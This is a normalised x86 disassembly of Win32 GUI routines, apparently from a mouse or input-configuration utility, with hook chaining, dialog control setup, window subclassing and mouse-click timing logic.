mov ebx [ esp + 0x14 ]
test ebx ebx
js r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ rw-data ]
push eax
push ecx
push esi
push edx
call [ CallNextHookEx@IAT ]
pop esi
retn 0xc
mov ecx [ esp + 0x10 ]
mov edx [ rw-data ]
push ebx
push ecx
push esi
push edx
call [ CallNextHookEx@IAT ]
pop ebx
pop esi
retn 0xc
push edi
mov edi [ esp + 0x14 ]
push 0x0
push edi
push 0x100
call [ GetFocus@IAT ]
push eax
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
push ebx
push edi
push esi
push eax
call [ CallNextHookEx@IAT ]
pop edi
pop ebx
mov eax 0x1
pop esi
retn 0xc
sub_459790
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
push edi
call [ LockWindowUpdate@IAT ]
mov ebp [ ShowWindow@IAT ]
mov ebx [ GetDlgItem@IAT ]
mov esi 0x1f4
mov [ esp + 0x10 ] 0xab
jmp r-xdata
push 0x0
lea eax [ esi - 0x190 ]
push eax
push edi
call ebx
push eax
call ebp
push 0x0
push esi
push edi
call ebx
push eax
call ebp
mov eax [ esp + 0x10 ]
inc esi
dec eax
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ esp + 0x20 ]
xor esi esi
xor eax eax
test ecx ecx
mov [ esp + 0x14 ] esi
jle r-xdata
mov ecx [ ecx * 4 + rw-data ]
add ecx esi
cmp esi ecx
mov [ esp + 0x10 ] esi
jge r-xdata
add esi [ eax * 4 + rw-data ]
inc eax
cmp eax ecx
jl r-xdata
push 0x0
call [ LockWindowUpdate@IAT ]
push 0x0
push 0x0
push edi
call [ InvalidateRect@IAT ]
push edi
call [ UpdateWindow@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
shl esi 0x4
add esi rw-data
mov [ esp + 0x14 ] esi
mov edx [ esi ]
mov eax [ esi - 0x4 ]
mov ecx [ esi - 0x8 ]
push 0x0
push 0x10
sub edx 0x64
push edx
mov edx [ esi - 0xc ]
add eax 0x2
shl eax 0x4
push eax
add ecx 0x14
push ecx
add edx 0x63
push edx
push edi
call ebx
push eax
call [ MoveWindow@IAT ]
mov eax [ esi - 0x4 ]
mov ecx [ esi ]
mov edx [ esi - 0x8 ]
push 0x0
push 0x10
push 0x64
shl eax 0x4
add eax 0x1e
push eax
lea eax [ ecx + edx - 0x50 ]
mov ecx [ esi - 0xc ]
push eax
add ecx 0x1f3
push ecx
push edi
call ebx
push eax
call [ MoveWindow@IAT ]
mov edx [ esi - 0xc ]
push 0x5
add edx 0x63
push edx
push edi
call ebx
push eax
call ebp
mov eax [ esi - 0xc ]
push 0x5
add eax 0x1f3
push eax
push edi
call ebx
push eax
call ebp
mov ecx [ esp + 0x20 ]
mov edx [ ecx * 4 + rw-data ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
inc eax
add edx ecx
add esi 0x10
cmp eax edx
mov [ esp + 0x10 ] eax
jl r-xdata
sub_4598f0
mov eax [ esp + 0x4 ]
cmp eax 0x3
je r-xdata
mov eax [ esp + 0xc ]
cmp eax 0x1
jl r-xdata
cmp eax 0x4
je r-xdata
xor eax eax
retn
dec eax
cmp eax 0xab
jge r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x3
je r-xdata
sub eax 0xab
cmp eax 0x6
jge r-xdata
inc eax
retn
mov eax [ esp + 0xc ]
cmp eax 0x1
jl r-xdata
cmp eax 0x4
je r-xdata
add eax 0x300
retn
dec eax
cmp eax 0x5
jge r-xdata
sub eax 0x5
cmp eax 0xab
jge r-xdata
add eax 0x200
retn
inc eax
retn
sub_459960
mov eax [ esp + 0x4 ]
cmp eax 0x3
je r-xdata
mov eax [ esp + 0xc ]
cmp eax 0x1
jl r-xdata
cmp eax 0x4
je r-xdata
xor eax eax
cmp eax 0xac
jl r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x3
je r-xdata
retn
cmp eax 0x306
jge r-xdata
mov eax [ esp + 0xc ]
cmp eax 0x1
jl r-xdata
cmp eax 0x4
je r-xdata
add eax 0xfffffdac
retn
cmp eax 0xac
jge r-xdata
cmp eax 0x205
jge r-xdata
add eax 0x5
retn
cmp eax 0x306
jge r-xdata
add eax 0xfffffe01
retn
add eax 0xfffffdb1
retn
sub_4599d0
push ecx
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
xor ebx ebx
push edi
mov edi [ SendMessageA@IAT ]
mov [ esp + 0x10 ] ebx
lea ecx [ ebp + ebp * 4 ]
lea edx [ ebx + ecx * 2 + 0x641 ]
push edx
push eax
call [ GetDlgItem@IAT ]
mov esi eax
mov eax [ esp + 0x20 ]
test eax eax
jne r-xdata
xor esi esi
jmp r-xdata
xor ecx ecx
test eax eax
jne r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
lea edx [ ebx + ebp * 8 ]
mov ecx [ edx * 4 + rw-data ]
jmp r-xdata
inc ebx
cmp ebx 0x8
mov [ esp + 0x10 ] ebx
jl r-xdata
push eax
push 0xf5
push 0x160
push esi
call edi
push r--data
push 0x0
push 0x143
push esi
call edi
cmp ebp 0x2
je r-xdata
cmp eax 0x3
jne r-xdata
lea eax [ ebx + ebp * 8 ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp [ esp + 0x20 ] 0x1
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ebx 0x4
cmp ebp 0x3
je r-xdata
cmp eax 0x4
jne r-xdata
lea ecx [ ebx + ebp * 8 ]
mov ecx [ ecx * 4 + rw-data ]
jmp r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax [ ebx + rw-data ]
push eax
push 0x0
push 0x143
push esi
call edi
add ebx 0x4
cmp ebx 0x2b0
jb r-xdata
xor ebx ebx
mov edi edi
cmp ebx 0x2
je r-xdata
cmp eax 0x1
je r-xdata
xor ecx ecx
jmp r-xdata
lea edx [ ebx + ebp * 8 ]
mov [ edx * 4 + rw-data ] ecx
push 0x0
push 0x0
push 0x147
push esi
call edi
push eax
lea ecx [ ebx + 0x1 ]
push ecx
lea edx [ ebp + 0x1 ]
push edx
call sub_4598f0
lea ecx [ ebx + ebp * 8 ]
add esp 0xc
mov [ ecx * 4 + rw-data ] eax
jmp r-xdata
push 0x0
push ecx
lea edx [ ebx + 0x1 ]
lea eax [ ebp + 0x1 ]
push edx
push eax
call sub_459960
add esp 0xc
push eax
push 0x14e
push esi
call edi
jmp r-xdata
mov ecx [ ebx + rw-data ]
push ecx
push 0x0
push 0x143
push esi
call edi
add ebx 0x4
cmp ebx 0x18
jb r-xdata
mov ebx [ esp + 0x10 ]
xor ebx ebx
cmp ebx 0x3
jne r-xdata
mov eax [ ebx + rw-data ]
push eax
push 0x0
push 0x143
push esi
call edi
add ebx 0x4
cmp ebx 0x14
jb r-xdata
mov ebx [ esp + 0x10 ]
cmp ebx 0x2
je r-xdata
mov ebx 0x4
jmp r-xdata
mov ecx [ ebx + rw-data ]
push ecx
push 0x0
push 0x143
push esi
call edi
add ebx 0x4
cmp ebx 0x2b0
jb r-xdata
xor ebx ebx
mov edi edi
mov edx [ ebx + rw-data ]
push edx
push 0x0
push 0x143
push esi
call edi
add ebx 0x4
cmp ebx 0x18
jb r-xdata
jmp r-xdata
sub_459bc0
sub esp 0x30
push ebx
mov ebx [ esp + 0x38 ]
push ebp
mov ebp [ esp + 0x40 ]
cmp ebp 0x111
push esi
push edi
ja r-xdata
cmp ebp 0x1400
je r-xdata
je r-xdata
mov esi [ esp + 0x44 ]
mov edi [ GetWindowRect@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
push esi
call edi
lea edx [ esp + 0x30 ]
push edx
push 0x1
push esi
call [ GetDlgItem@IAT ]
push eax
call edi
mov eax [ esp + 0x30 ]
mov edi [ esp + 0x38 ]
mov ebx [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
sub edi eax
mov eax [ esp + 0x2c ]
push 0x6
sub eax ebx
sub eax 0x14
push eax
sub ecx [ esp + 0x28 ]
lea edx [ ecx + edi + 0xc ]
push edx
push 0x0
push 0x0
push 0x0
push esi
call [ SetWindowPos@IAT ]
lea eax [ esp + 0x10 ]
push eax
push esi
call [ GetClientRect@IAT ]
push 0xfffffffa
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
push 0x0
mov ebp eax
push ebp
push 0x60e
push esi
push 0x24
push edi
add ecx 0x64
push ecx
sub edx edi
sub edx 0x6
push edx
push 0x50032000
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x0
push 0x31
push esi
mov [ esp + 0x64 ] eax
call ebx
push eax
mov eax [ esp + 0x58 ]
push 0x30
push eax
call ebx
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
push 0x0
push ebp
push 0x60f
push esi
push 0x24
push edi
add ecx 0x91
push ecx
sub edx edi
sub edx 0x6
push edx
push 0x50012000
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
push 0x0
push 0x0
push 0x0
push 0x31
push esi
mov [ esp + 0x64 ] eax
call ebx
push eax
mov eax [ esp + 0x58 ]
push 0x30
push eax
call ebx
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
push 0x0
push ebp
push 0x614
push esi
push 0x24
push edi
add ecx 0xbe
push ecx
sub edx edi
sub edx 0x6
push edx
push 0x50012000
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
push 0x0
push 0x0
push 0x0
push 0x31
push esi
mov ebp eax
call ebx
push eax
push 0x30
push ebp
call ebx
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov ebx [ GetDlgItem@IAT ]
push 0x5
push 0x0
push 0x0
add eax 0x16
push eax
sub ecx edi
sub ecx 0x6
push ecx
push 0x0
push 0x1
push esi
call ebx
mov ebp [ SetWindowPos@IAT ]
push eax
call ebp
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
push 0x5
push 0x0
push 0x0
add edx 0x30
push edx
sub eax edi
sub eax 0x6
push eax
push 0x0
push 0x2
push esi
call ebx
push eax
call ebp
push 0x5
push esi
call [ ShowWindow@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x30
retn 0x10
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x4c ]
mov eax [ rw-data ]
push ecx
push edx
push ebp
push ebx
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn 0x10
movzx eax [ esp + 0x4c ]
cmp eax 0x60f
jg r-xdata
mov eax ebp
sub eax 0x2
je r-xdata
cmp eax 0x614
jne r-xdata
je r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x44 ]
push edx
push 0xfffffffc
push eax
call [ SetWindowLongA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x30
retn 0x10
sub eax 0x4c
jne r-xdata
push 0x0
push eax
push 0x46c
push ebx
mov [ rw-data ] 0x4
call [ SendMessageA@IAT ]
jmp r-xdata
push 0x0
push 0x60f
push 0x46c
push ebx
mov [ rw-data ] 0x3
call [ SendMessageA@IAT ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x50 ]
mov edi [ SendMessageA@IAT ]
mov esi [ eax ]
push 0x0
push 0x0
push 0x474
push ebx
call edi
cmp esi eax
jne r-xdata
xor esi esi
sub eax 0x60d
jne r-xdata
mov ecx [ esp + 0x50 ]
cmp [ ecx + 0x8 ] 0xfffffdd9
jne r-xdata
push 0x1
push esi
push 0x0
call sub_4599d0
add esp 0xc
inc esi
cmp esi 0x7
jl r-xdata
jmp r-xdata
push 0x0
push 0x60e
push 0x46c
push ebx
mov [ rw-data ] 0x2
call [ SendMessageA@IAT ]
jmp r-xdata
push 0x0
push 0x0
push 0x130b
push esi
call edi
mov [ rw-data ] eax
jmp r-xdata
sub_459ee0
mov eax [ esp + 0x8 ]
cmp eax 0x2
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0xc ]
and [ eax ] 0xefffffff
xor eax eax
retn 0xc
xor eax eax
retn 0xc
push esi
mov esi [ esp + 0x8 ]
push sub_459bc0
push 0xfffffffc
push esi
call [ SetWindowLongA@IAT ]
push 0x0
push 0x0
push 0x1400
push esi
mov [ rw-data ] eax
call [ PostMessageA@IAT ]
pop esi
sub_459f30
mov eax [ esp + 0x8 ]
cmp eax 0x111
push esi
ja r-xdata
cmp eax 0x46c
jne r-xdata
je r-xdata
xor eax eax
pop esi
retn 0x10
movzx eax [ esp + 0x10 ]
sub eax 0x60e
je r-xdata
cmp [ esp + 0x10 ] 0x613
jne r-xdata
cmp eax 0x4e
je r-xdata
mov esi [ esp + 0x8 ]
push 0x2
push 0x0
push esi
call sub_4599d0
push 0x2
push 0x1
push esi
call sub_4599d0
add esp 0x18
dec eax
je r-xdata
mov eax 0x1
pop esi
retn 0x10
mov esi [ esp + 0x8 ]
push ebx
mov ebx [ GetDlgItem@IAT ]
push ebp
push edi
mov edi [ SendMessageA@IAT ]
mov ebp 0x64b
mov [ esp + 0x1c ] 0x8
mov edi edi
mov eax [ esp + 0x14 ]
cmp [ eax + 0x8 ] 0xffffff36
jne r-xdata
cmp eax 0x110
jne r-xdata
mov esi [ esp + 0x8 ]
push 0x3
push 0x0
push esi
call sub_4599d0
push 0x3
push 0x1
push esi
call sub_4599d0
add esp 0x18
xor eax eax
pop esi
retn 0x10
sub eax 0x5
jne r-xdata
push 0x0
push 0x0
push 0x147
lea eax [ ebp - 0xa ]
push eax
push esi
call ebx
push eax
call edi
push 0x0
push 0x0
push 0x147
push ebp
push esi
mov [ esp + 0x28 ] eax
call ebx
push eax
call edi
push 0x0
push eax
push 0x14e
lea eax [ ebp - 0xa ]
push eax
push esi
call ebx
push eax
call edi
mov ecx [ esp + 0x14 ]
push 0x0
push ecx
push 0x14e
push ebp
push esi
call ebx
push eax
call edi
mov eax [ esp + 0x1c ]
inc ebp
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
pop edi
pop ebp
pop ebx
mov eax 0x1
pop esi
retn 0x10
mov esi [ esp + 0x8 ]
push 0x1
push 0x0
push esi
call sub_4599d0
push 0x1
mov esi [ esp + 0x8 ]
push 0x0
push 0x0
push esi
call sub_4599d0
push 0x0
jmp r-xdata
mov esi [ esp + 0x8 ]
push 0x4
push 0x0
push esi
call sub_4599d0
push 0x4
push 0x1
push esi
call sub_4599d0
add esp 0x18
xor eax eax
pop esi
retn 0x10
push 0x1
push esi
call sub_4599d0
add esp 0x18
sub_45a0b0
mov eax [ esp + 0x8 ]
cmp eax 0x4e
push esi
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax + 0x8 ] 0xffffff36
jne r-xdata
cmp eax 0x110
je r-xdata
mov eax 0x1
pop esi
retn 0x10
mov esi [ esp + 0x8 ]
push 0x1
push 0x2
push esi
call sub_4599d0
push 0x1
push 0x3
push esi
call sub_4599d0
push 0x1
push 0x4
push esi
call sub_4599d0
add esp 0x24
mov esi [ esp + 0x8 ]
push 0x0
push 0x2
push esi
call sub_4599d0
push 0x0
push 0x3
push esi
call sub_4599d0
push 0x0
push 0x4
push esi
call sub_4599d0
add esp 0x24
mov eax 0x1
pop esi
retn 0x10
cmp eax 0x46c
jne r-xdata
xor eax eax
pop esi
retn 0x10
movzx eax [ esp + 0x10 ]
sub eax 0x60e
je r-xdata
mov esi [ esp + 0x8 ]
push 0x2
push 0x2
push esi
call sub_4599d0
push 0x2
push 0x3
push esi
call sub_4599d0
push 0x2
push 0x4
push esi
call sub_4599d0
add esp 0x24
dec eax
je r-xdata
mov esi [ esp + 0x8 ]
push 0x3
push 0x2
push esi
call sub_4599d0
push 0x3
push 0x3
push esi
call sub_4599d0
push 0x3
push 0x4
push esi
call sub_4599d0
add esp 0x24
xor eax eax
pop esi
retn 0x10
sub eax 0x5
jne r-xdata
mov esi [ esp + 0x8 ]
push 0x4
push 0x2
push esi
call sub_4599d0
push 0x4
push 0x3
push esi
call sub_4599d0
push 0x4
push 0x4
push esi
call sub_4599d0
add esp 0x24
xor eax eax
pop esi
retn 0x10
sub_45a1e0
mov eax [ esp + 0x8 ]
cmp eax 0x4e
push esi
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax + 0x8 ] 0xffffff36
jne r-xdata
cmp eax 0x110
je r-xdata
mov eax 0x1
pop esi
retn 0x10
mov esi [ esp + 0x8 ]
push 0x1
push 0x5
push esi
call sub_4599d0
push 0x1
push 0x6
push esi
call sub_4599d0
add esp 0x18
mov esi [ esp + 0x8 ]
push 0x0
push 0x5
push esi
call sub_4599d0
push 0x0
push 0x6
push esi
call sub_4599d0
add esp 0x18
mov eax 0x1
pop esi
retn 0x10
cmp eax 0x46c
jne r-xdata
xor eax eax
pop esi
retn 0x10
movzx eax [ esp + 0x10 ]
sub eax 0x60e
je r-xdata
mov esi [ esp + 0x8 ]
push 0x2
push 0x5
push esi
call sub_4599d0
push 0x2
push 0x6
push esi
call sub_4599d0
add esp 0x18
dec eax
je r-xdata
mov esi [ esp + 0x8 ]
push 0x3
push 0x5
push esi
call sub_4599d0
push 0x3
push 0x6
push esi
call sub_4599d0
add esp 0x18
xor eax eax
pop esi
retn 0x10
sub eax 0x5
jne r-xdata
mov esi [ esp + 0x8 ]
push 0x4
push 0x5
push esi
call sub_4599d0
push 0x4
push 0x6
push esi
call sub_4599d0
add esp 0x18
xor eax eax
pop esi
retn 0x10
sub_45a2d0
mov eax [ esp + 0xc ]
sub esp 0x108
push esi
mov esi [ esp + 0x114 ]
cmp esi 0x3
je r-xdata
cmp eax 0x4
jne r-xdata
cmp esi 0x4
je r-xdata
lea edx [ eax + esi * 8 ]
mov eax [ edx * 4 + rw-data ]
mov ecx [ rw-data ]
cmp ecx 0x1
jle r-xdata
cmp eax 0x3
jne r-xdata
push ecx
shl esi 0x5
mov ecx [ esi + rw-data ]
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
lea eax [ esp + 0xc ]
jmp r-xdata
push edi
lea eax [ esp + 0x8 ]
push eax
call [ GetCursorPos@IAT ]
mov edi [ esp + 0x114 ]
lea ecx [ esp + 0x8 ]
push ecx
push edi
call [ ScreenToClient@IAT ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push edx
push eax
shl esi 0x5
mov ecx [ esi + rw-data ]
push ecx
lea edx [ esp + 0x1c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x14
lea eax [ esp + 0x10 ]
push eax
push 0x726
push edi
call [ GetParent@IAT ]
push eax
call [ SetDlgItemTextA@IAT ]
pop edi
pop esi
add esp 0x108
retn
mov ecx [ esp + 0x110 ]
push eax
push 0x726
push ecx
call [ GetParent@IAT ]
push eax
call [ SetDlgItemTextA@IAT ]
pop esi
add esp 0x108
retn
sub_45a3c0
sub esp 0x20
push ebx
push ebp
mov ebp [ esp + 0x30 ]
cmp ebp 0x205
push esi
mov esi [ esp + 0x30 ]
push edi
ja r-xdata
lea eax [ ebp - 0x207 ]
cmp eax 0x9c
ja r-xdata
je r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x3c ]
push eax
push ecx
push ebp
push esi
call [ DefWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn 0x10
movzx edx [ eax + lookup_table_45abe0 ]
jmp [ edx * 4 + jump_table_45abcc ]
movzx edx [ esp + 0x3c ]
mov [ rw-data ] edx
call [ GetCapture@IAT ]
cmp eax esi
jne r-xdata
cmp ebp 0x201
ja r-xdata
push r--data
push 0x726
push esi
call [ GetParent@IAT ]
push eax
call [ SetDlgItemTextA@IAT ]
mov eax [ rw-data ]
movzx ebx [ esp + 0x3c ]
mov edx [ rw-data ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x40 ]
movzx ecx ax
shr eax 0x10
push esi
mov [ rw-data ] ebx
mov [ esp + 0x14 ] edx
mov [ rw-data ] ecx
mov [ rw-data ] eax
call [ SetCapture@IAT ]
xor edi edi
cmp ebp 0x201
jne r-xdata
cmp ebp 0x7
jne r-xdata
mov eax [ esp + 0x3c ]
shr eax 0x10
movsx ecx ax
mov eax 0x77777777
imul ecx
mov eax [ rw-data ]
sub edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edx 0x0
setns dl
xor ebp ebp
mov ebx eax
add edx 0x3
test al 0x1
mov edi edx
je r-xdata
push 0xa
push esi
call [ KillTimer@IAT ]
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
call [ ReleaseCapture@IAT ]
mov eax ebp
sub eax 0x202
je r-xdata
je r-xdata
cmp ebp 0x204
jne r-xdata
mov edi 0x1
and ebx 0xfffffffe
jmp r-xdata
push esi
call [ GetParent@IAT ]
push eax
call [ SetFocus@IAT ]
push 0x1
push 0x0
push esi
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] 0x10
mov [ esp + 0x18 ] 0x2
mov [ esp + 0x1c ] esi
call [ _TrackMouseEvent@IAT ]
jmp r-xdata
test al 0x2
je r-xdata
mov esi 0x1
jmp r-xdata
push r--data
push 0x726
push esi
call [ GetParent@IAT ]
push eax
call [ SetDlgItemTextA@IAT ]
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
jne r-xdata
sub eax 0x2
jne r-xdata
cmp ebp 0x7
je r-xdata
cmp ebp 0x207
jne r-xdata
mov edi 0x2
and ebx 0xfffffffd
jmp r-xdata
test bl 0x1
je r-xdata
push esi
call [ GetDC@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push esi
mov edi eax
call [ GetClientRect@IAT ]
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov ebx [ esp + 0x1c ]
mov eax 0x4
add ecx eax
add edx eax
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x10 ] edx
lea edx [ esp + 0x10 ]
push edx
sub ebx eax
sub ecx eax
push edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x20 ] ecx
call [ DrawFocusRect@IAT ]
push edi
push esi
call [ ReleaseDC@IAT ]
jmp r-xdata
test al 0x10
je r-xdata
mov esi 0x2
jmp r-xdata
call [ timeGetTime@IAT ]
cmp esi ebp
mov [ rw-data ] eax
mov [ rw-data ] ebp
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp ebp 0x113
je r-xdata
cmp ebp 0x20b
jne r-xdata
mov edi 0x5
and ebx 0xffffffef
jmp r-xdata
test bl 0x2
je r-xdata
mov ebx 0x1
jmp r-xdata
test al 0x24
jne r-xdata
mov esi 0x5
jmp r-xdata
mov ecx [ esp + 0x34 ]
push 0x1
push edi
push ecx
call sub_45a2d0
add esp 0xc
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn 0x10
cmp esi 0x5
mov [ rw-data ] ebp
jle r-xdata
xor edi edi
cmp ebp 0x202
jne r-xdata
call [ timeGetTime@IAT ]
mov esi eax
mov eax [ esp + 0x3c ]
sub eax 0xa
je r-xdata
cmp ebp 0x200
jne r-xdata
mov eax [ esp + 0x3c ]
shr eax 0x10
cmp ax 0x1
jne r-xdata
test bl 0x10
je r-xdata
mov ebx 0x2
jmp r-xdata
xor eax eax
cmp ebx edi
jne r-xdata
mov esi 0x6
mov esi [ GetAsyncKeyState@IAT ]
push 0x10
call esi
test ah ah
js r-xdata
mov eax [ esp + 0x34 ]
inc esi
push esi
push edi
push eax
call sub_45a2d0
add esp 0xc
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn 0x10
sub esi 0x3
cmp ebp 0x205
jne r-xdata
mov edi 0x1
jmp r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ GetParent@IAT ]
push 0x0
push 0x0
push 0x468
push 0x71e
push edi
call ebx
mov ebp [ GetDlgItem@IAT ]
push eax
call ebp
push eax
call [ SendMessageA@IAT ]
movsx ecx ax
mov eax [ rw-data ]
mov edx esi
sub edx eax
cmp edx ecx
jl r-xdata
dec eax
jne r-xdata
mov edi esi
push edi
call [ SetFocus@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp ax 0x2
jne r-xdata
mov edi 0x6
and ebx 0xffffffdf
test bl 0x24
jne r-xdata
mov ebx 0x5
jmp r-xdata
cmp [ rw-data ] eax
jne r-xdata
xor ebx ebx
test bl 0x48
jne r-xdata
cmp ebp 0x208
jne r-xdata
mov edi 0x2
jmp r-xdata
push 0x70c
push esi
mov [ rw-data ] edi
mov [ rw-data ] ebx
call [ GetParent@IAT ]
push eax
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
push 0x0
push 0x0
push 0x468
push 0x723
push edi
call ebx
push eax
call ebp
push eax
call [ SendMessageA@IAT ]
mov ebx [ rw-data ]
movsx eax ax
mov ecx esi
sub ecx ebx
cmp ecx eax
jl r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn 0x10
mov edi [ esp + 0x34 ]
push 0x0
push 0x0
push 0x468
push 0x70b
push edi
call [ GetParent@IAT ]
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
mov edx [ rw-data ]
movsx eax ax
sub esi edx
cmp esi eax
jl r-xdata
jle r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
je r-xdata
mov edi 0x7
and ebx 0xffffffbf
jmp r-xdata
mov ebx 0x6
test bl 0x48
jne r-xdata
mov edx [ esp + 0x40 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov eax 0x20c
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x3c ]
push edx
push eax
mov [ esp + 0x1c ] 0x202
mov [ esp + 0x20 ] 0x205
mov [ esp + 0x2c ] 0x208
mov ecx [ esp + edi * 4 + 0x18 ]
push ecx
push esi
mov [ rw-data ] edi
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn 0x10
cmp [ rw-data ] eax
jne r-xdata
mov esi 0x7
jmp r-xdata
push 0x11
call esi
test ah ah
js r-xdata
cmp ebp 0x20c
jne r-xdata
mov edi 0x5
jmp r-xdata
push 0x1
push edi
push esi
call sub_45a2d0
add esp 0xc
push ebx
push 0xa
push 0xb
push esi
mov [ rw-data ] edi
call [ SetTimer@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xb
push edi
call [ KillTimer@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn 0x10
push 0x3
push eax
push edi
call sub_45a2d0
add esp 0xc
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn 0x10
push 0x0
push 0x0
push 0x468
push 0x714
push edi
call [ GetParent@IAT ]
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
mov esi [ esp + 0x40 ]
movsx ecx ax
mov eax [ rw-data ]
movzx edx si
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jg r-xdata
mov ebx 0x7
jmp r-xdata
xor ebx ebx
jmp r-xdata
call [ timeGetTime@IAT ]
test ebx ebx
mov ebp eax
mov [ rw-data ] edi
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ esp + 0x3c ]
shr eax 0x10
cmp ax 0x1
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
push 0x1
push eax
push edi
call sub_45a2d0
add esp 0xc
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn 0x10
push 0xa
push edi
call [ KillTimer@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
shr esi 0x10
sub eax esi
cdq
xor eax edx
sub eax edx
cmp eax ecx
jle r-xdata
cmp [ rw-data ] edi
jne r-xdata
cmp edi ebx
jge r-xdata
cmp ax 0x2
jne r-xdata
mov edi 0x6
mov ebp [ rw-data ]
push 0x4
push eax
inc ebp
push edi
mov [ rw-data ] ebp
call sub_45a2d0
add esp 0xc
pop edi
mov [ rw-data ] esi
pop esi
pop ebp
mov [ rw-data ] 0x0
xor eax eax
pop ebx
add esp 0x20
retn 0x10
test eax eax
je r-xdata
test eax eax
mov eax [ rw-data ]
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] ebp
je r-xdata
mov ebx [ GetSystemMetrics@IAT ]
push 0x24
call ebx
mov edx [ rw-data ]
mov ecx eax
mov eax [ esp + 0x10 ]
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jl r-xdata
cmp ebx 0x3
jle r-xdata
dec ebx
cmp edi ebx
je r-xdata
mov edi 0x7
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn 0x10
push 0x0
push 0x0
push 0x468
push 0x723
push esi
call [ GetParent@IAT ]
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
push 0x0
movsx ecx ax
push 0xa
push 0xa
sub ebp ecx
push esi
